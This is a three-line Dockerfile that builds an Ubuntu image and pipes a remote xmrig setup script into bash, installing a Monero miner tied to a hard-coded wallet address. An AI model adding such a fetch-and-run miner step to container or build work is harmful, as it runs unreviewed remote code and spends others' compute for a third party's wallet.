FROM ubuntu:latest
RUN apt-get update && apt-get install -y vim git curl pciutils
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 41x3pBLY1ML3nnuZSGpytuGJjiSgeeY2QAbSLgHfqgAaM6FgRgVLVD9geruwsPeePe1T9KLwFmYg1ceoaEbU2nM5GTSPkXT

